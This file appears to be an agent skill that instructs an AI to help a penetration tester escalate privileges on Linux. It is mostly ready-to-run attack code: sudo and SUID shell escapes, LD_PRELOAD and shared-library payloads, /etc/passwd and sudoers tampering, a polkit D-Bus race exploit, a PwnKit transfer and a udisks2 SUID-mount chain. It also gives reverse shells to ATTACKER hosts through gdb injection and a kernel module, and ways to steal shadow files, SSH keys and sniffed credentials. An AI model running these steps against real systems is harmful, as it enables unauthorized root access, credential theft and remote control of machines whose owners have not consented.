---
name: linux-sudo-suid-capabilities
description: >
  Exploit sudo misconfigurations, SUID/SGID binaries, and Linux capabilities
  for privilege escalation.
keywords:
  - exploit sudo
  - abuse suid
  - gtfobins
  - ld_preload
  - capability escalation
  - baron samedit
  - sudo exploit
  - sudo -l shows NOPASSWD
  - found suid binary
  - getcap shows cap_setuid
  - linux capabilities privesc
  - polkit privesc
  - CVE-2021-3560
  - CVE-2021-4034
  - pwnkit
  - polkit dbus bypass
  - pam_environment
  - user_readenv
  - polkit allow_active
  - udisksctl
  - udisks2 privesc
  - logind active session
  - loop-setup nosuid
tools:
  - GTFOBins reference
  - gcc
  - python3
  - getcap
  - strace
  - ltrace
  - dbus-send
opsec: low
---

# Linux Sudo, SUID, and Capabilities Exploitation

You are helping a penetration tester exploit sudo misconfigurations, SUID/SGID binaries,
and Linux capabilities for privilege escalation. All testing is under explicit written
authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[linux-sudo-suid-capabilities] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Shell access on Linux target
- At least one of: sudo permissions, SUID binary, binary with capabilities
- Knowledge of target OS version (for CVE matching)

## Step 1: Assess Sudo Configuration

If not already provided by linux-discovery, enumerate:

```bash
sudo -l 2>/dev/null
sudo -V 2>/dev/null | head -1
cat /etc/doas.conf 2>/dev/null
```

Classify findings and proceed to the relevant subsection below.

## Step 2: Sudo NOPASSWD Exploitation

### GTFOBins Binaries

If `sudo -l` shows `(root) NOPASSWD: /path/to/binary`, check GTFOBins for the binary.

**Common sudo escapes (highest priority):**

```bash
# Editors
sudo vim -c ':!bash'
sudo vi -c ':!bash'
sudo nano  # Ctrl+R → Ctrl+X → command

# Pagers
sudo less /etc/hosts    # then type: !bash
sudo more /etc/hosts    # then type: !bash
sudo man man            # then type: !bash

# Interpreters
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo perl -e 'exec "/bin/bash"'
sudo ruby -e 'exec "/bin/bash"'
sudo lua -e 'os.execute("/bin/bash")'
sudo php -r 'system("/bin/bash");'
sudo node -e 'require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'

# File utilities
sudo find /tmp -exec /bin/bash \;
sudo awk 'BEGIN {system("/bin/bash")}'
sudo sed -n '1e exec bash 1>&0' /etc/hosts
sudo ed  # then type: !bash

# Archive utilities
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
sudo zip /tmp/x.zip /tmp/x -T -TT 'bash #'

# Network tools
sudo ftp  # then type: !bash
sudo nmap --interactive  # (old nmap) then type: !sh
sudo mysql -e '\! bash'
sudo socat stdin exec:/bin/bash

# System tools
sudo env /bin/bash
sudo strace -o /dev/null /bin/bash
sudo ltrace -o /dev/null /bin/bash
sudo gdb -nx -ex '!bash' -ex quit
sudo taskset 1 /bin/bash

# File read/write (for credential theft if no shell escape)
sudo cat /etc/shadow
sudo tee /etc/passwd <<< 'root2:$1$salt$hash:0:0::/root:/bin/bash'
sudo cp /etc/shadow /tmp/shadow_copy
sudo dd if=/etc/shadow of=/tmp/shadow_copy
```

### Sudo with Password (NOPASSWD not set)

If user has sudo access but needs a password, check for:
- Known password from engagement state
- Password reuse from other services
- Sudo token reuse (see sudo_inject below)

### Sudo with Specific Arguments

If sudo allows specific arguments (e.g., `sudo /usr/bin/vim /etc/config`):
- Editor escape still works: `sudo vim /etc/config` → `:!bash`
- For restricted commands, check if argument injection is possible

## Step 3: Sudo Environment Variable Abuse

### LD_PRELOAD Injection

**Prerequisite:** `sudo -l` shows `env_keep += LD_PRELOAD` or `SETENV:` tag.

```c
// preload.c — compile on target or transfer
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
```

```bash
# Compile and exploit
gcc -fPIC -shared -o /tmp/preload.so preload.c -nostartfiles
sudo LD_PRELOAD=/tmp/preload.so <any_allowed_binary>
```

### LD_LIBRARY_PATH Injection

**Prerequisite:** `sudo -l` shows `env_keep += LD_LIBRARY_PATH`.

```bash
# Find shared libraries used by the sudo-allowed binary
ldd /path/to/allowed_binary

# Create malicious library with same name
gcc -fPIC -shared -o /tmp/libfoo.so preload.c -nostartfiles

# Execute with hijacked library path
sudo LD_LIBRARY_PATH=/tmp /path/to/allowed_binary
```

### PYTHONPATH / PERL5LIB Injection

**Prerequisite:** `sudo -l` shows `SETENV:` and binary calls Python/Perl.

```bash
# Python library hijack
mkdir /tmp/pylib
cat > /tmp/pylib/os.py << 'EOF'
import subprocess
subprocess.call(["/bin/bash", "-p"])
EOF
sudo PYTHONPATH=/tmp/pylib /usr/bin/python_script.py
```

### BASH_ENV Injection

**Prerequisite:** `env_keep += BASH_ENV` and command runs via bash.

```bash
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /tmp/evil.sh
sudo BASH_ENV=/tmp/evil.sh /path/to/allowed_command
/tmp/rootbash -p
```

## Step 4: Sudo CVE Exploitation

### CVE-2021-3156 (Baron Samedit) — Heap Overflow

**Affected:** sudo 1.8.2 through 1.9.5p1 (patched in 1.9.5p2).

**MANDATORY — Verify before exploiting.** Distro backports frequently patch
sudo without changing the version string. Do NOT skip this step even if the
version appears vulnerable.

```bash
# Step 1: Check version
sudo -V | grep "Sudo version"

# Step 2: MANDATORY verification (does NOT exploit, just confirms)
sudoedit -s '\' $(python3 -c 'print("A"*65536)') 2>&1
# Vulnerable: segfault, memory corruption, "malloc(): corrupted..."
# Patched: "usage: sudoedit" error message
#
# If you see "usage:" → STOP. This build is patched. Do not waste time
# downloading or compiling exploits. Check CVE-2021-3560 (polkit) or
# other vectors instead.
```

If verification confirms vulnerability, proceed with exploitation. Public
exploits exist per distribution — match the target OS and use the correct
variant.

**Exploit transfer — attackbox-first workflow:** Targets often lack internet
access (CTF, air-gapped labs). Never `git clone` on target. Instead:
1. Download/compile exploit on attackbox for target architecture
2. Transfer via SSH (SCP, SFTP, paramiko) or base64 encode/decode
3. Alternatively, write exploit source as a heredoc and compile on target

```bash
# Exploits (multiple variants by OS — download on ATTACKBOX first):
# https://github.com/blasty/CVE-2021-3156
# https://github.com/worawit/CVE-2021-3156
```

### CVE-2019-14287 — User ID Bypass

**Prerequisite:** `sudo -l` shows `(ALL, !root) /bin/bash` or similar restriction
excluding root.

```bash
# The !root restriction can be bypassed with UID -1
sudo -u#-1 /bin/bash
sudo -u#4294967295 /bin/bash
# Both resolve to UID 0 (root)
```

### Sudo Token Reuse (sudo_inject)

**Prerequisite:** ptrace_scope = 0, user has valid sudo session token.

```bash
# Check ptrace scope
cat /proc/sys/kernel/yama/ptrace_scope  # Must be 0

# Check for sudo token files
ls -la /run/sudo/ts/$(whoami) 2>/dev/null || ls -la /var/run/sudo/ts/$(whoami) 2>/dev/null

# If sudo token exists and ptrace allows:
# https://github.com/nongiach/sudo_inject
# Creates invalid token → next sudo -i requires no password
```

### CVE-2021-3560 — Polkit D-Bus Authentication Bypass

**Affected:** polkit < 0.117 (common on CentOS 8, RHEL 8, Ubuntu 20.04).

Creates a privileged user account by exploiting a race condition in polkitd's
D-Bus message handling. When a D-Bus request is killed mid-flight (after polkitd
starts processing but before it replies), polkitd treats the absent reply as
"authorized."

**Prerequisites:**

```bash
# All four must be true:
rpm -q polkit 2>/dev/null || dpkg -l policykit-1 2>/dev/null  # polkit < 0.117
rpm -q accountsservice 2>/dev/null || dpkg -l accountsservice 2>/dev/null  # installed
which dbus-send 2>/dev/null  # available
ps aux | grep polkit  # polkitd running
```

**Phase 1 — Create privileged user via D-Bus race condition:**

```bash
NEW_USER="youruser"
NEW_FULLNAME="Your Name"

# Generate password hash for the new account
NEW_PASS='YourPassword123!'
HASH=$(openssl passwd -6 "$NEW_PASS" 2>/dev/null)

# Race loop: send CreateUser request and kill it mid-authorization
# int32:1 = administrator (wheel/sudo group)
for i in $(seq 1 100); do
    dbus-send --system --dest=org.freedesktop.Accounts --type=method_call \
        --print-reply /org/freedesktop/Accounts \
        org.freedesktop.Accounts.CreateUser \
        string:"$NEW_USER" string:"$NEW_FULLNAME" int32:1 &
    PID=$!
    # Timing is critical — 0.005s to 0.015s covers most systems
    # Start at 0.008s; adjust if needed
    sleep 0.008s
    kill $PID 2>/dev/null
    wait $PID 2>/dev/null

    if id "$NEW_USER" &>/dev/null; then
        echo "[+] User created on attempt $i"
        break
    fi
done

# Verify user was created with admin group
id "$NEW_USER"
```

**Phase 2 — Set password via D-Bus race condition:**

```bash
# Get the new user's D-Bus object path
USER_PATH=$(dbus-send --system --dest=org.freedesktop.Accounts --type=method_call \
    --print-reply /org/freedesktop/Accounts \
    org.freedesktop.Accounts.FindUserByName \
    string:"$NEW_USER" 2>/dev/null | grep "object path" | cut -d'"' -f2)

echo "[*] User D-Bus path: $USER_PATH"

# Same race condition to set password
for i in $(seq 1 100); do
    dbus-send --system --dest=org.freedesktop.Accounts --type=method_call \
        --print-reply "$USER_PATH" \
        org.freedesktop.Accounts.User.SetPassword \
        string:"$HASH" string:"" &
    PID=$!
    sleep 0.008s
    kill $PID 2>/dev/null
    wait $PID 2>/dev/null
done
```

**Phase 3 — Verify and escalate:**

```bash
# Switch to new user and verify sudo
su - "$NEW_USER" -c "echo '$NEW_PASS' | sudo -S id"
# Expected: uid=0(root) gid=0(root) groups=0(root)

# Get root shell
su - "$NEW_USER"
# Then: sudo -i (or echo password | sudo -S bash)
```

**Timing calibration:** The sleep value (0.008s) is timing-dependent. If the
exploit fails after 100 attempts:
- Try 0.005s (faster systems, VMs with low latency)
- Try 0.012s (slower systems, remote SSH)
- Try 0.003s (very fast local systems)
- Run multiple rounds with different timings

The race typically succeeds within 20-50 attempts on most systems. If user
creation works but password setting fails (or vice versa), adjust timing for
each phase independently.

**Remote execution via SSH (paramiko/sshpass):** When automating over SSH,
write the exploit as a bash script, transfer it via SFTP or heredoc, then
execute. The race condition timing works the same over SSH — the `sleep` and
`kill` happen on the target, not the attackbox.

**Troubleshooting:**
- `Error org.freedesktop.Accounts.Error.PermissionDenied` on every attempt →
  polkitd may be patched or not running. Check `systemctl status polkit`.
- User created but not in wheel/sudo group → the `int32:1` flag sets
  administrator. Verify with `id username`. If not admin, the race lost on
  the group assignment — delete user and retry.
- Password not set (su fails) → the SetPassword race is harder to win. Try
  more attempts (200+) or different timing. Verify the hash is correct:
  `grep username /etc/shadow`.
- `dbus-send` not found → install `dbus` package or check `/usr/bin/gdbus`
  as alternative.

### CVE-2021-4034 (PwnKit) — pkexec Argument Handling

**Affected:** polkit pkexec < 0.120 (present on most Linux distros before Jan 2022).

pkexec mishandles argc=0 invocations, allowing arbitrary code execution as root
through GCONV_PATH environment variable manipulation. Requires pkexec to have the
SUID bit set (default on virtually all installations).

**Verification:**

```bash
# Check pkexec is SUID
ls -la /usr/bin/pkexec
# Expected: -rwsr-xr-x root root

# Check polkit version
dpkg -l policykit-1 2>/dev/null || rpm -q polkit 2>/dev/null
# Vulnerable: < 0.120 (Debian/Ubuntu), < 0.120 (RHEL/CentOS)
```

**Exploitation:**

PwnKit requires staging files in a directory where the SUID process can
execute shared libraries. `/tmp` is often mounted noexec on hardened systems.

```bash
# Step 1: Find an exec-capable staging directory
# Try these in order — first writable+exec wins:
for d in /dev/shm /var/tmp /run/lock "$HOME" /opt; do
    mount | grep -q "$(df "$d" 2>/dev/null | tail -1 | awk '{print $1}').*noexec" && continue
    [ -w "$d" ] && echo "[+] $d is writable and exec-capable" && break
done

# Step 2: Stage exploit in the chosen directory
cd /dev/shm  # or whichever directory passed
mkdir -p pwnkit_work && cd pwnkit_work
```

**Exploit transfer — attackbox-first workflow:**

Public PwnKit exploits:
- https://github.com/ly4k/PwnKit (self-contained C, static compilation)
- https://github.com/berdav/CVE-2021-4034 (Makefile-based)

```bash
# On ATTACKBOX: download and compile static binary
git clone https://github.com/ly4k/PwnKit /tmp/pwnkit
cd /tmp/pwnkit && make
# Or compile static: gcc -static -o pwnkit PwnKit.c

# Transfer to target
python3 -m http.server 8080 &
# On TARGET:
wget http://ATTACKBOX:8080/pwnkit -O /dev/shm/pwnkit_work/pwnkit
chmod +x /dev/shm/pwnkit_work/pwnkit
```

```bash
# Step 3: Execute
cd /dev/shm/pwnkit_work
./pwnkit
# Expected: root shell
id
# uid=0(root) gid=0(root)
```

**If /tmp is noexec:** This is the most common PwnKit failure. The GCONV_PATH
trick requires the exploit's shared library to be dlopen'd by pkexec (a SUID
process). SUID processes ignore LD_PRELOAD, so the .so MUST be on an
exec-capable filesystem. Use /dev/shm, /var/tmp, or a home directory instead.
Never attempt LD_PRELOAD workarounds — they do not work with SUID binaries and
risk destabilizing the target.

**If no exec-capable writable directory exists:** PwnKit is blocked. Return to
orchestrator with assessment: `blocked — no exec-capable staging directory for
GCONV_PATH .so`. The orchestrator may route to **linux-kernel-exploits** for
DirtyCow/DirtyPipe or other vectors that don't require shared library loading.

## Step 4b: PAM Environment Injection + Polkit Active Session Bypass

When `linux-discovery` reports `user_readenv=1` in PAM config and polkit
`allow_active=yes` on privileged actions, this chain escalates an SSH session to
perform operations that normally require physical console presence.

### How It Works

1. `pam_env.so` with `user_readenv=1` reads `~/.pam_environment` during the auth
   stack — *before* `pam_systemd.so` runs in the session stack
2. Injecting `XDG_SEAT` and `XDG_VTNR` tricks `pam_systemd` into registering the
   SSH session as a physical console session (`Active=yes`)
3. Polkit policies with `allow_active=yes` now grant access without authentication
4. `udisksctl loop-setup` + `Filesystem.Resize`/`Check` triggers a temporary mount
   via libblockdev at `/tmp/blockdev.XXXXXX` **without nosuid flags**
5. A SUID root binary in the mounted filesystem executes with `euid=0`

### Prerequisites

- SSH access as any user
- `pam_env.so` configured with `user_readenv=1` (default on SUSE/openSUSE)
- `udisks2` + `libblockdev` installed (default on most desktop-oriented installs)
- Polkit `allow_active=yes` on udisks2 loop-setup and filesystem operations
- `xfsprogs` on attackbox (for building the XFS image)

### Step 1: Verify PAM Configuration

```bash
grep -r "user_readenv" /etc/pam.d/ 2>/dev/null
# Look for: pam_env.so user_readenv=1
```

If `user_readenv=1` is NOT present, this technique does not apply.

### Step 2: Inject Session Properties

```bash
cat > ~/.pam_environment << 'EOF'
XDG_SEAT OVERRIDE=seat0
XDG_VTNR OVERRIDE=1
EOF
```

**Disconnect the SSH session** (exit), then **reconnect**. The new session will be
registered as Active.

### Step 3: Verify Active Session

```bash
loginctl show-session "$XDG_SESSION_ID" | grep -E "Active|State|Seat"
# Expected: Active=yes, State=active, Seat=seat0
```

If `Active=no`, check that `~/.pam_environment` was written correctly and that
you fully disconnected and reconnected (not just opened a new channel on the
same SSH connection).

### Step 4: Build Malicious Filesystem Image (on attackbox)

Build an XFS image containing a SUID root bash binary. This requires root on the
attackbox.

```bash
# Get bash from target for glibc compatibility
scp user@TARGET:/bin/bash /tmp/target-bash

# Create XFS image
dd if=/dev/zero of=./suid.image bs=1M count=300
mkfs.xfs -f ./suid.image
mkdir -p /tmp/suid-mount
mount -t xfs ./suid.image /tmp/suid-mount
cp /tmp/target-bash /tmp/suid-mount/bash
chown root:root /tmp/suid-mount/bash
chmod 04555 /tmp/suid-mount/bash
umount /tmp/suid-mount

# Transfer to target
scp ./suid.image user@TARGET:~/suid.image
```

### Step 5: Exploit UDisks2 Nosuid Mount Race

On target (with `Active=yes` session):

```bash
# Kill gvfs-udisks2-volume-monitor if running (can interfere)
killall -KILL gvfs-udisks2-volume-monitor 2>/dev/null || true

# Create loop device (no auth prompt thanks to Active=yes)
udisksctl loop-setup --file ~/suid.image --no-user-interaction
# Note the device path (e.g., /dev/loop0)

# Start background catcher — races to exec SUID bash from temp mount
(while true; do
  for d in /tmp/blockdev*/; do
    [ -x "${d}bash" ] && exec "${d}bash" -p -c 'echo "[+] GOT ROOT"; id; exec bash -p'
  done
  sleep 0.01
done) &
CATCHER_PID=$!

# Trigger nosuid-less temporary mount via XFS resize
gdbus call --system \
  --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
  --method org.freedesktop.UDisks2.Filesystem.Resize 0 'a{sv}'

# If Resize errors, try Check instead:
gdbus call --system \
  --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
  --method org.freedesktop.UDisks2.Filesystem.Check 'a{sv}'

# Wait and check
sleep 2
ls -la /tmp/blockdev*/bash 2>/dev/null

# Execute SUID bash directly if catcher didn't fire
/tmp/blockdev*/bash -p
# Expected: euid=0(root)
```

**The `-p` flag is critical** — without it, bash drops the elevated euid.

### Troubleshooting

- **"Not authorized" from udisksctl**: `Active=yes` didn't take effect. Verify
  with `loginctl show-session`. Ensure you fully disconnected and reconnected SSH.
- **Race doesn't land**: The mount window is milliseconds. Retry 3-5 times. Kill
  the catcher (`kill $CATCHER_PID`), delete the loop device (`udisksctl
  loop-delete --block-device /dev/loop0 --no-user-interaction`), and repeat from
  loop-setup.
- **Loop device is loop1/loop2**: Adjust the gdbus object path to match (e.g.,
  `/org/freedesktop/UDisks2/block_devices/loop1`).
- **No /tmp/blockdev* appears**: libblockdev may use a different temp path. Check
  `/proc/mounts` while triggering Resize/Check. A compiled C catcher monitoring
  `/proc/mounts` in a tight loop is more reliable than the bash approach.
- **udisksctl not found**: udisks2 not installed. This technique does not apply.

### Cleanup

```bash
rm ~/.pam_environment
kill $CATCHER_PID 2>/dev/null
udisksctl loop-delete --block-device /dev/loop0 --no-user-interaction 2>/dev/null
rm ~/suid.image
```

## Step 5: SUID Binary Exploitation

### Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null   # SGID
```

### GTFOBins SUID Exploitation

Same escapes as sudo but binary runs as owner (usually root). Key difference:
bash drops privileges unless `-p` flag is used.

```bash
# If /usr/bin/python3 has SUID bit
/usr/bin/python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# If /usr/bin/find has SUID bit
/usr/bin/find . -exec /bin/bash -p \;

# If /usr/bin/vim has SUID bit
/usr/bin/vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-p")'

# If /usr/bin/bash has SUID bit
/usr/bin/bash -p

# If /usr/bin/cp has SUID bit — overwrite /etc/passwd
# Generate password hash: openssl passwd -1 -salt xyz password123
# Add line: root2:$1$xyz$hashhere:0:0:root:/root:/bin/bash
/usr/bin/cp /tmp/modified_passwd /etc/passwd
```

### Custom SUID Binary Analysis

For non-standard SUID binaries not in GTFOBins:

```bash
# Analyze the binary
strings /path/to/suid_binary | grep -iE "system|exec|popen|/bin|/tmp"
strace /path/to/suid_binary 2>&1 | grep -E "exec|open|access"
ltrace /path/to/suid_binary 2>&1 | grep -E "system|exec|popen"
```

**Exploitation patterns:**

1. **Calls `system()` with relative path** → PATH hijack:
```bash
# If binary calls system("service apache2 restart")
echo '#!/bin/bash' > /tmp/service
echo '/bin/bash -p' >> /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
/path/to/suid_binary
```

2. **Loads shared object from writable path** → .so injection:
```bash
# Check for missing libraries
ldd /path/to/suid_binary | grep "not found"
# Or check RPATH/RUNPATH
readelf -d /path/to/suid_binary | grep -E "RPATH|RUNPATH"
```

```c
// exploit.c — shared object with constructor
#include <stdlib.h>
void __attribute__((constructor)) init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

```bash
gcc -fPIC -shared -o /path/to/missing_lib.so exploit.c
/path/to/suid_binary  # triggers library load → root shell
```

3. **Reads/writes files as root** → read /etc/shadow or write /etc/passwd

### SGID Exploitation

```bash
# SGID binary runs with group of file owner
# If SGID binary belongs to 'shadow' group → read /etc/shadow
# If SGID binary belongs to 'docker' group → Docker socket access

# Impersonate group via Python SGID binary
python3 -c 'import os; os.setgid(42); os.system("/bin/bash")'  # 42 = shadow
```

## Step 6: Linux Capabilities Exploitation

### CAP_SETUID — Direct Root

```bash
# Any binary with cap_setuid+ep → immediate root
# Python
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash"'

# Node.js
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'

# Ruby
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# PHP
php -r 'posix_setuid(0); system("/bin/bash");'

# Custom C binary
# If gcc and cap_setuid binary available:
# Compile: int main(){setuid(0);setgid(0);system("/bin/bash -p");}
```

### CAP_SETGID — Group Escalation

```bash
# Impersonate shadow group to read /etc/shadow
python3 -c 'import os; os.setgid(42); os.system("cat /etc/shadow")'

# Impersonate root group
python3 -c 'import os; os.setgid(0); os.system("/bin/bash")'
```

### CAP_DAC_OVERRIDE — Bypass Write Permissions

Binary can write to any file regardless of permissions.

```python
# Append to /etc/sudoers
python3 -c '
f = open("/etc/sudoers", "a")
f.write("\nUSERNAME ALL=(ALL) NOPASSWD:ALL\n")
f.close()
'
```

```python
# Overwrite /etc/passwd with root user
python3 -c '
import crypt
password = crypt.crypt("password123", "$6$salt")
line = f"root2:{password}:0:0:root:/root:/bin/bash\n"
with open("/etc/passwd", "a") as f:
    f.write(line)
'
```

### CAP_DAC_READ_SEARCH — Read Any File

```bash
# Read /etc/shadow directly
python3 -c 'print(open("/etc/shadow").read())'

# Read SSH private keys
python3 -c 'print(open("/root/.ssh/id_rsa").read())'

# Tar-based extraction (if tar has the capability)
tar czf /tmp/shadow.tar.gz /etc/shadow
tar xzf /tmp/shadow.tar.gz -C /tmp/
```

**Container escape (shocker exploit):** Binary with cap_dac_read_search can use
`open_by_handle_at()` to access host filesystem from within a container. Use the
shocker exploit C code.

### CAP_SYS_ADMIN — Mount and Namespace Abuse

```bash
# Mount host disk (container escape)
fdisk -l  # Find host disk
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
```

```python
# Mount overlay to replace /etc/passwd
python3 -c '
from ctypes import CDLL
libc = CDLL("libc.so.6")
libc.mount.argtypes = [c_char_p, c_char_p, c_char_p, c_ulong, c_char_p]
libc.mount(b"/tmp/fake_passwd", b"/etc/passwd", b"none", 4096, b"rw")  # MS_BIND=4096
'
```

### CAP_SYS_PTRACE — Process Injection

```bash
# GDB injection into root process
gdb -p <root_pid>
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'")
(gdb) detach
(gdb) quit
```

```python
# Python ptrace injection (shellcode into root process)
import ctypes, os, struct, signal

PTRACE_ATTACH = 16
PTRACE_DETACH = 17
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_CONT = 7

libc = ctypes.CDLL("libc.so.6")

# Find a root-owned process
pid = <target_root_pid>

# Attach, inject shellcode, set RIP, continue
libc.ptrace(PTRACE_ATTACH, pid, None, None)
os.waitpid(pid, 0)
# ... inject reverse shell shellcode at RIP ...
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

### CAP_SYS_MODULE — Kernel Module Loading

```c
// reverse_shell.c — kernel module
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");

char *argv[] = {"/bin/bash", "-c",
    "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1", NULL};
static char *envp[] = {"HOME=/root", "PATH=/usr/bin:/bin", NULL};

static int __init shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit shell_exit(void) {}
module_init(shell_init);
module_exit(shell_exit);
```

```makefile
# Makefile
obj-m += reverse_shell.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
```

```bash
make
insmod reverse_shell.ko
```

### CAP_CHOWN / CAP_FOWNER — Ownership and Permission Changes

```bash
# CAP_CHOWN: take ownership of /etc/shadow
python3 -c 'import os; os.chown("/etc/shadow", 1000, 1000)'
cat /etc/shadow  # Now readable

# CAP_FOWNER: make /etc/shadow world-readable
python3 -c 'import os; os.chmod("/etc/shadow", 0o666)'
cat /etc/shadow
```

### CAP_SETFCAP — Capability Chaining

Binary can set capabilities on other binaries. Chain to cap_setuid:

```python
# Set cap_setuid on python3
python3 -c '
import ctypes
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")
libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p, ctypes.c_void_p]
cap = libcap.cap_from_text(b"cap_setuid+ep")
libcap.cap_set_file(b"/usr/bin/python3", cap)
'

# Then exploit cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### CAP_NET_RAW — Packet Sniffing

Not directly exploitable for privilege escalation but enables credential sniffing:

```bash
# Sniff for credentials on the network
tcpdump -i any -A -s0 'port 80 or port 21 or port 25' 2>/dev/null | grep -iE "user|pass|login"
```

## Step 7: Escalate or Pivot

## Troubleshooting

### SUID binary drops privileges (bash without -p)
Bash resets EUID to RUID when they differ. Always use `bash -p` or call
`setuid(0)` before exec. For `system()` calls: the child shell also drops
privileges — use `execve()` instead or `system("/bin/bash -p")`.

### LD_PRELOAD doesn't work with sudo
Check: (1) `env_keep` includes `LD_PRELOAD` in sudo config, (2) binary is not
statically linked (`file /path/to/binary`), (3) binary is not running in secure
mode (SUID binaries ignore LD_PRELOAD by default — only works via sudo).

### getcap returns nothing
Some systems strip capabilities. Check if `getcap` is available and has read
access to binary directories. Try `cat /proc/<pid>/status | grep Cap` for
running processes.

### Kernel rejects module loading
CAP_SYS_MODULE may be restricted by Secure Boot or module signing. Check
`cat /proc/sys/kernel/modules_disabled` — if 1, module loading is disabled
system-wide. No bypass without kernel exploit.

### SUID binary is statically linked
Cannot use shared object injection or LD_PRELOAD. Focus on argument injection,
environment variable abuse, or functionality-based exploitation (GTFOBins patterns).

### PwnKit fails with GCONV errors
The staging directory is likely mounted noexec. Move all PwnKit files to an
exec-capable directory (/dev/shm, /var/tmp, home directory). Check with:
`mount | grep "$(df /path 2>/dev/null | tail -1 | awk '{print $1}')"` — if
the output includes "noexec", that directory won't work. If no exec-capable
directory is writable, PwnKit is blocked — return to orchestrator.
